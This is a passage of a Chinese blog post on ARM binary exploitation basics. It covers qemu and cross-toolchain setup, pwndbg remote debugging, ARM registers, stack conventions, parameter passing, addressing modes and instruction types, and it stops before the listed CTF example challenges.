<!DOCTYPE html>
<html lang="en">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="ARM-pwn"/><meta name="keywords" content="CTF" /><link rel="alternate" href="/atom.xml" title="pz1o"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="https://pz1o.top/2021/04/29/arm-pwn/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" /><script type="text/x-mathjax-config">
    MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
  </script>
  <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<script id="baidu_analytics">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?e90b4c8b8c36ca2b3e5798ef67088f84";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script src="//cdn1.lncld.net/static/js/3.1.1/av-min.js"></script>
  <script id="leancloud">
    AV.init({
      appId: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
      appKey: "FL93w3BBbF9lxiR8X1HI58En"
    });
  </script><script>
  window.config = {"leancloud":{"app_id":"KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz","app_key":"FL93w3BBbF9lxiR8X1HI58En"},"toc":true,"fancybox":true,"pjax":"","latex":true};
</script>

    <title>ARM-pwn - pz1o</title>
  <meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="pz1o" type="application/atom+xml">
</head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">pz1o</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/archives/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">pz1o</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">ARM-pwn
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-04-29
        </span><span class="post-visits"
             data-url="/2021/04/29/arm-pwn/"
             data-title="ARM-pwn">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-ARM环境搭建"><span class="toc-text">0x01 ARM环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-ARM基础知识"><span class="toc-text">0x02 ARM基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-寄存器"><span class="toc-text">1. 寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-堆栈"><span class="toc-text">2. 堆栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-传参"><span class="toc-text">3. 传参</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-返回值"><span class="toc-text">4. 返回值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-访址"><span class="toc-text">5. 访址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-汇编基础知识"><span class="toc-text">6. 汇编基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#跳转指令"><span class="toc-text">跳转指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据传送指令"><span class="toc-text">数据传送指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序状态寄存器处理指令"><span class="toc-text">程序状态寄存器处理指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#加载存储指令"><span class="toc-text">加载存储指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#协处理器指令"><span class="toc-text">协处理器指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#异常产生指令"><span class="toc-text">异常产生指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-AArch64架构"><span class="toc-text">7. AArch64架构</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-例题"><span class="toc-text">0x03 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jarvis-Typo"><span class="toc-text">Jarvis-Typo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2018上海市baby-arm"><span class="toc-text">2018上海市baby_arm</span></a></li></ol></li></ol>
    </div>
  </div><div class="post-content"><h1 id="0x01-ARM环境搭建"><a href="#0x01-ARM环境搭建" class="headerlink" title="0x01 ARM环境搭建"></a>0x01 ARM环境搭建</h1><p>安装qemu和arm的一些包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br><span class="line">sudo apt-get install qemu-system qemu-user-static binfmt-support</span><br><span class="line"></span><br><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line">sudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt git</span><br><span class="line">sudo apt-get install libc6-arm64-cross libc6-armel-cross libc6-armhf-cross libc6-mips-cross libc6-mips32-mips64-cross libc6-mips32-mips64el-cross libc6-mips64-cross libc6-mips64-mips-cross libc6-mips64-mipsel-cross libc6-mips64el-cross libc6-mipsel-cross libc6-mipsn32-mips-cross libc6-mipsn32-mips64-cross libc6-mipsn32-mips64el-cross libc6-mipsn32-mipsel-cross</span><br><span class="line"></span><br><span class="line">apt search binutils | grep [arch]</span><br></pre></td></tr></table></figure>
<p>寻找相关的链接库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search &quot;libc6-&quot; | grep &quot;arm&quot;</span><br></pre></td></tr></table></figure>
<p>指定相关的链接库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;vuln</span><br></pre></td></tr></table></figure>
<p>调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1235 -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;vuln</span><br></pre></td></tr></table></figure>
<p>pwndbg进行调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set architecture arm </span><br><span class="line">pwndbg&gt; target remote localhost:1235</span><br></pre></td></tr></table></figure>
<p>相关工具链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;编译器</span><br><span class="line">arm-linux-gnueabi-gcc demo.c</span><br><span class="line">&#x2F;&#x2F;反汇编</span><br><span class="line">arm-linux-gnueabi-objdump -sd  demo.so</span><br><span class="line">&#x2F;&#x2F;readelf</span><br><span class="line">arm-linux-gnueabi-readelf -h demo.so                         </span><br><span class="line">ELF 头：</span><br><span class="line">  Magic：   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  类别:                              ELF32</span><br><span class="line">  数据:                              2 补码，小端序 (little endian)</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS&#x2F;ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          0</span><br><span class="line">  类型:                              DYN (共享目标文件)</span><br><span class="line">  系统架构:                          ARM</span><br><span class="line">  版本:                              0x1</span><br><span class="line">  入口点地址：               0x2a4</span><br><span class="line">  程序头起点：          52 (bytes into file)</span><br><span class="line">  Start of section headers:          6152 (bytes into file)</span><br><span class="line">  标志：             0x5000200, Version5 EABI, soft-float ABI</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         6</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         23</span><br><span class="line">  Section header string table index: 22</span><br></pre></td></tr></table></figure>
<h1 id="0x02-ARM基础知识"><a href="#0x02-ARM基础知识" class="headerlink" title="0x02 ARM基础知识"></a>0x02 ARM基础知识</h1><p>先来看一下arm的历史</p>
<p><img src="/2021/04/29/arm-pwn/2136036-16042211014K30.png" alt="ARM的发展史以及架构解析"></p>
<p>接下来看一下ARM的编译器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">arch [-vendor] [-os] [-(gnu)eabi]</span><br><span class="line"></span><br><span class="line">arch - 体系架构，如ARM，MIPS</span><br><span class="line">verdor - 工具链提供商</span><br><span class="line">os - 目标操作系统</span><br><span class="line">eabi - 嵌入式应用二进制接口</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">arm-none-eabi-gcc</span><br><span class="line">用于编译 ARM 架构的裸机系统（包括 ARM Linux 的 boot、kernel，不适用编译 Linux 应用 Application）</span><br><span class="line"></span><br><span class="line">arm-linux-gnueabi-gcc</span><br><span class="line">主要用于基于ARM架构的Linux系统，可用于编译 ARM 架构的 u-boot、Linux内核、linux应用等。</span><br><span class="line"></span><br><span class="line">arm-eabi-gcc</span><br><span class="line">Android ARM 编译器。</span><br><span class="line"></span><br><span class="line">armcc</span><br><span class="line">ARM 公司推出的编译工具，功能和 arm-none-eabi 类似，可以编译裸机程序（u-boot、kernel），</span><br><span class="line"></span><br><span class="line">但是不能编译 Linux 应用程序。</span><br></pre></td></tr></table></figure>
<p>ARM架构使用了与Intel/AMD架构所不同的精简指令集(RISC)，因此其函数调用约定以及寄存器也有了一定的差异。</p>
<p>ARM架构有两种模式，ARM模式和Thumb模式。Thumb模式的代码只有2或者4字节。</p>
<p>ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。</p>
<h2 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1. 寄存器"></a>1. 寄存器</h2><ol>
<li>子程序间通过寄存器<strong>R0～R3</strong>来<strong>传递参数</strong>。这时，寄存器R0～R3可记作arg0～arg3。<strong>被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值</strong>。</li>
<li>在子程序中，使用寄存器<strong>R4～R11</strong>来<strong>保存局部变量</strong>。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则<strong>子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值</strong>。<strong>R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP</strong>。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。</li>
<li>寄存器<strong>R12</strong>用作<strong>过程调用中间临时寄存器</strong>，记作IP。在子程序之间的连接代码段中常常有这种使用规则。</li>
<li>寄存器<strong>R13</strong>用作<strong>堆栈指针</strong>，记作SP。在子程序中寄存器R13不能用作其他用途。<strong>寄存器SP在进入子程序时的值和退出子程序时的值必须相等</strong>。</li>
<li>寄存器<strong>R14</strong>称为<strong>连接寄存器</strong>，记作LR。它用于<strong>保存子程序的返回地址</strong>。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。</li>
<li>寄存器<strong>R15</strong>是<strong>程序计数器</strong>，记作PC。它不能用作其它用途。当执行一个分支指令时，<strong>PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置</strong>。</li>
</ol>
<p>ARM和Intel的对比</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">ARM架构 寄存器名</th>
<th style="text-align:center">寄存器描述</th>
<th style="text-align:center">Intel架构 寄存器名</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">R0</td>
<td style="text-align:center">通用寄存器</td>
<td style="text-align:center">EAX</td>
</tr>
<tr>
<td style="text-align:center">R1~R5</td>
<td style="text-align:center">通用寄存器</td>
<td style="text-align:center">EBX、ECX、EDX、EDI、ESI</td>
</tr>
<tr>
<td style="text-align:center">R6~R10</td>
<td style="text-align:center">通用寄存器</td>
<td style="text-align:center">无</td>
</tr>
<tr>
<td style="text-align:center">R11(FP)</td>
<td style="text-align:center">栈帧指针</td>
<td style="text-align:center">EBP</td>
</tr>
<tr>
<td style="text-align:center">R12(IP)</td>
<td style="text-align:center">内部程序调用</td>
<td style="text-align:center">无</td>
</tr>
<tr>
<td style="text-align:center">R13(SP)</td>
<td style="text-align:center">堆栈指针</td>
<td style="text-align:center">ESP</td>
</tr>
<tr>
<td style="text-align:center">R14(LR)</td>
<td style="text-align:center">链接寄存器</td>
<td style="text-align:center">无</td>
</tr>
<tr>
<td style="text-align:center">R15(PC)</td>
<td style="text-align:center">程序计数器</td>
<td style="text-align:center">EIP</td>
</tr>
<tr>
<td style="text-align:center">CPSR</td>
<td style="text-align:center">程序状态寄存器</td>
<td style="text-align:center">EFLAGS</td>
</tr>
</tbody>
</table>
</div>
<h2 id="2-堆栈"><a href="#2-堆栈" class="headerlink" title="2. 堆栈"></a>2. 堆栈</h2><ol>
<li><p>ATPCS规定堆栈为FD类型，即Full Descending，意思是 <strong>SP指向最后一个压入的值(栈顶)，数据栈由高地址向低地址生长</strong>，即满递减堆栈，并且对堆栈的操作是8字节对齐。所以经常使用的指令就有<strong>STMFD和LDMFD</strong>。</p>
</li>
<li><p>STMFD指令即Store Multiple FULL Descending指令，相当于压栈。<code>STMFD SP! ,{R0-R7，LR}</code>实际上会执行以下命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SP = SP - <span class="number">9</span> x <span class="number">4</span> (共计压入R0-R7以及LR一共九个寄存器)</span><br><span class="line">ADDRESS = SP</span><br><span class="line">MEMORY[ADDRESS] = LR</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">7</span> to <span class="number">0</span></span><br><span class="line">    MEMORY[ADDRESS] = Ri</span><br><span class="line">    ADDRESS = ADDRESS + <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>最终实现的堆栈图片<img src="/2021/04/29/arm-pwn/image-20210429201433283.png" alt="image-20210429201433283"></p>
<blockquote>
<p>若入栈指令为<code>STMFD SP ,{R0-R7，LR}</code>，SP指针会在最后回到原位，不会改变SP指针的值。</p>
</blockquote>
</li>
<li><p>LDMFD指令即Load Multiple FULL Descending指令，相当于出栈，也就是STMFD指令的逆操作。<code>LDMFD SP! ,{R0-R7，LR}</code>实际上会执行以下命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SP = SP + <span class="number">9</span> x <span class="number">4</span></span><br><span class="line">ADDRESS = SP</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">0</span> to <span class="number">7</span></span><br><span class="line">    Ri = MEMORY[ADDRESS]</span><br><span class="line">    ADDRESS = ADDRESS - <span class="number">4</span></span><br><span class="line">LR = MEMORY[ADDRESS]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="3-传参"><a href="#3-传参" class="headerlink" title="3. 传参"></a>3. 传参</h2><ol>
<li>对于参数个数可变的子程序，当参数个数不超过4个时，可以使用寄存器R0～R3来传递参数；当参数超过4个时，还可以使用堆栈来传递参数。</li>
<li>在传递参数时，将所有参数看作是存放在连续的内存字单元的字数据。然后，依次将各字数据传递到寄存器R0，R1，R2和R3中。<strong>如果参数多于4个，则将剩余的字数据传递到堆栈中。入栈的顺序与参数传递顺序相反，即最后一个字数据先入栈。</strong></li>
</ol>
<h2 id="4-返回值"><a href="#4-返回值" class="headerlink" title="4. 返回值"></a>4. 返回值</h2><ol>
<li>结果为一个32位整数时，可以通过寄存器R0返回</li>
<li>结果为一个64位整数时，可以通过寄存器R0和R1返回</li>
<li>结果为一个浮点数时，可以通过浮点运算部件的寄存器f0、d0或s0来返回</li>
<li>结果为复合型浮点数（如复数）时，可以通过寄存器f0～fn或d0～dn来返回</li>
<li>对于位数更多的结果，需要通过内存来传递。</li>
</ol>
<h2 id="5-访址"><a href="#5-访址" class="headerlink" title="5. 访址"></a>5. 访址</h2><ol>
<li><p>通常，LDR指令被用来从内存中加载数据到寄存器，STR指令被用作将寄存器的值存放到内存中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ LDR操作：从R0指向的地址中取值放到R2中</span><br><span class="line">LDR R2, [R0]   @ [R0] - 数据源地址来自于R0指向的内存地址</span><br><span class="line">@ STR操作：将R2中的值放到R1指向的地址中</span><br><span class="line">STR R2, [R1]   @ [R1] - 目的地址来自于R1在内存中指向的地址</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.data          ;&#x2F;* 据段是在内存中动态创建的，所以它的在内存中的地址不可预测*&#x2F;</span><br><span class="line">var1: .word 3  ;&#x2F;内存中的第一个变量且赋值为3 *&#x2F;</span><br><span class="line">var2: .word 4 ;&#x2F;* 内存中的第二个变量且赋值为4 *&#x2F;</span><br><span class="line"></span><br><span class="line">.text         ;&#x2F;* 代码段开始 *&#x2F; </span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ldr r0, adr_var1 ;@ 将存放var1值的地址adr_var1加载到寄存器R0中 </span><br><span class="line">    ldr r1, adr_var2 ;@ 将存放var2值的地址adr_var2加载到寄存器R1中 </span><br><span class="line">    ldr r2, [r0]     ;@ 将R0所指向地址中存放的0x3加载到寄存器R2中  </span><br><span class="line">    str r2, [r1]     ;@ 将R2中的值0x3存放到R1做指向的地址，此时，var2变量的值是0x3a</span><br><span class="line">    bkpt        </span><br><span class="line"></span><br><span class="line">adr_var1: .word var1 ;&#x2F;* var1的地址助记符 *&#x2F;</span><br><span class="line">adr_var2: .word var2 ;&#x2F;* var2的地址助记符 *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">000003c8 &lt;main&gt;:</span><br><span class="line"> 3c8:	e59f000c 	ldr	r0, [pc, #12]	; 3dc &lt;adr_var1&gt;</span><br><span class="line"> 3cc:	e59f100c 	ldr	r1, [pc, #12]	; 3e0 &lt;adr_var2&gt;</span><br><span class="line"> 3d0:	e5902000 	ldr	r2, [r0]</span><br><span class="line"> 3d4:	e5812000 	str	r2, [r1]</span><br><span class="line"> 3d8:	e1200070 	bkpt	0x0000</span><br><span class="line"></span><br><span class="line">000003dc &lt;adr_var1&gt;:</span><br><span class="line"> 3dc:	00011028 	.word	0x00011028</span><br><span class="line"></span><br><span class="line">000003e0 &lt;adr_var2&gt;:</span><br><span class="line"> 3e0:	0001102c 	.word	0x0001102c</span><br></pre></td></tr></table></figure>
<ol>
<li><p>这种形如<code>[Ri , num]</code>的方式被称为<strong>立即数作偏移寻址</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, #2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。</span><br><span class="line">str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1&#x3D;R1+4。</span><br><span class="line">ldr r3, [r1], #4  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1&#x3D;R1+4。</span><br></pre></td></tr></table></figure>
</li>
<li><p>形如的<code>[Ri , Rj]</code>方式被称为寄存器作偏移寻址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 </span><br><span class="line">str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1&#x3D;R1+R2。</span><br><span class="line">ldr r3, [r1], r2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1&#x3D;R1+R2。</span><br></pre></td></tr></table></figure>
</li>
<li><p>形如<code>[Ri , Rj , &lt;shifter&gt;]</code>的方式被称为寄存器缩放值作偏移寻址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2, LSL#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。</span><br><span class="line">str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 &#x3D; R1 + R2&lt;&lt;2。</span><br><span class="line">ldr r3, [r1], r2, LSL#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 &#x3D; R1 + R2&lt;&lt;2。</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="6-汇编基础知识"><a href="#6-汇编基础知识" class="headerlink" title="6. 汇编基础知识"></a>6. 汇编基础知识</h2><p>ARM指令主要分为以下六种：跳转，数据处理，程序状态寄存器处理，加载存储，协处理，异常产生指令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MOV    X1，X0         ;将寄存器X0的值传送到寄存器X1</span><br><span class="line">ADD    X0，X1，X2     ;寄存器X1和X2的值相加后传送到X0</span><br><span class="line">SUB    X0，X1，X2     ;寄存器X1和X2的值相减后传送到X0</span><br><span class="line">AND    X0，X0，#0xF    ; X0的值与0xF相位与后的值传送到X0</span><br><span class="line">ORR    X0，X0，#9      ; X0的值与9相位或后的值传送到X0</span><br><span class="line">EOR    X0，X0，#0xF    ; X0的值与0xF相异或后的值传送到X0</span><br><span class="line">LDR    X5，[X6，#0x08]        ；X6寄存器加0x08的和的地址值内的数据传送到X5</span><br><span class="line">STR X0, [SP, #0x8]         ；X0寄存器的数据传送到SP+0x8地址值指向的存储空间</span><br><span class="line">STP  x29, x30, [sp, #0x10]    ;入栈指令</span><br><span class="line">LDP  x29, x30, [sp, #0x10]    ;出栈指令</span><br><span class="line">CBZ  ;比较（Compare），如果结果为零（Zero）就转移（只能跳到后面的指令）</span><br><span class="line">CBNZ ;比较，如果结果非零（Non Zero）就转移（只能跳到后面的指令）</span><br><span class="line">CMP  ;比较指令，相当于SUBS，影响程序状态寄存器CPSR </span><br><span class="line">B&#x2F;BL  ;绝对跳转#imm， 返回地址保存到LR（X30）</span><br><span class="line">RET   ;子程序返回指令，返回地址默认保存在LR（X30）</span><br></pre></td></tr></table></figure>
<h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><p>跳转指令有两种</p>
<ol>
<li>专门跳转指令，实现向前和向后32MB的跳转</li>
<li>直接修改PC寄存器，向PC内写入目的地址，实现4GB地址空间的跳转</li>
</ol>
<p>eg：</p>
<ol>
<li><code>B</code>：执行一个简单的跳转，目标地址是相对于当前<code>PC</code>值的偏移地址</li>
<li><code>BL</code>：跳转之前会把<code>PC</code>值存到<code>R14</code>寄存器中，通常用于函数调用</li>
<li><code>BLX</code>：和上一个指令相比，多的功能是将处理器的工作状态由<code>ARM</code>变成<code>Thumb</code></li>
<li><code>BX</code>：可以跳转到<code>ARM</code>指令或者<code>Thumb</code>指令</li>
</ol>
<h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><p>可分为数据传送指令、算术逻辑运算运算、比较指令</p>
<ol>
<li><code>MOV</code>：和X86是差不多的</li>
<li><code>MVN</code>：在转移之前先按位取反</li>
<li><code>CMP</code>：两个寄存器中的值进行比较，不改变寄存器的值，但是更新CPSR标志寄存器</li>
<li><code>ADD</code>：把后两个寄存器相加，结果存在第一个寄存器中</li>
<li><code>SUB</code>：把后两个寄存器相减，结果存在第一个寄存器中</li>
<li><code>AND</code>：逻辑与</li>
<li><code>ORR</code>：逻辑或</li>
<li><code>EOR</code>：异或</li>
<li><code>MUL</code>：把后两个寄存器相乘，结果存在第一个寄存器中</li>
</ol>
<h3 id="程序状态寄存器处理指令"><a href="#程序状态寄存器处理指令" class="headerlink" title="程序状态寄存器处理指令"></a>程序状态寄存器处理指令</h3><ol>
<li><code>MRS</code>：用于将程序状态寄存器的内容送到通用寄存器</li>
<li><code>MSR</code>：将操作数的内容送到程序状态寄存器的特定域</li>
</ol>
<h3 id="加载存储指令"><a href="#加载存储指令" class="headerlink" title="加载存储指令"></a>加载存储指令</h3><p>适用于在寄存器和存储器之间数据的传输</p>
<ol>
<li><code>LDR</code>：将一个32位的数据送到寄存器中</li>
<li><code>LDRB</code>：将一个8位的数据送到寄存器中，并且把高24位清零</li>
